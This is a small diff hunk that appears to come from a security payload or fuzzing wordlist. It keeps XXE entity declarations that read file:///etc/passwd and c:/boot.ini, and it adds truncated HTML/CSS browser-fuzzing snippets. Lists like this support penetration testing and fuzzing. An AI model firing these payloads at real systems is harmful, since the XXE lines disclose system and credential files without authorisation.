@@ -10,4 +10,7 @@
 <!ENTITY % three SYSTEM "file:///etc/passwd">
 <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
 <!DOCTYPE	html[	<!ENTITY	%	foo	SYSTEM	"file:///c:/boot.ini">	%foo;]>	
+<!DOCTYPE html PUBLIC "" ""><style xmlns="http://www.w3.org/1999/xhtml ">*{animation-name:a}@-ms-keyframes a{0%{font:menu
+<!DOCTYPE html><script>(d=document).createElement("table").appendChild(d.createElement("head"))</script>
+<meta http-equiv="X-UA-Compat" content="IE=8"><h3><a></a><a><b></a></h3><style>*:after{content:counter(x);
 /* RFI END */
